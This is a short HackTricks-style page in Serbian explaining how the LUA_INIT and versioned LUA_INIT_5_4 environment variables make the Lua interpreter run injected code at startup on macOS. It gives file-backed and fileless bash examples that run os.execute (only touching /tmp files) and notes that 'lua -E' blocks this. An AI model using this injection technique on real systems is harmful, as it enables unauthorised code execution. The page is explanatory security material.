# Injektovanje Lua aplikacija u macOS

{{#include ../../../banners/hacktricks-training.md}}

## `LUA_INIT`

Pre obrade opcija komandne linije ili ciljne skripte, samostalni Lua interpreter izvršava `LUA_INIT_<major>_<minor>` ili, ako promenljiva sa verzijom ne postoji, `LUA_INIT`. Vrednost koja počinje znakom `@` navodi datoteku; svaka druga vrednost se direktno izvršava kao Lua kod. Ovo omogućava izvršavanje pri pokretanju, zasnovano i na datoteci i bez datoteke.<sup>[[1]](#references)</sup>
```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```
Tačan naziv sa verzijom menja se u zavisnosti od interpreter-a, na primer `LUA_INIT_5_4`. `lua -E` zanemaruje sve promenljive okruženja, uključujući početni kod i putanje Lua modula.

## References

- [1] [Samostalni Lua 5.4 interpreter](https://www.lua.org/manual/5.4/manual.html#7)
{{#include ../../../banners/hacktricks-training.md}}
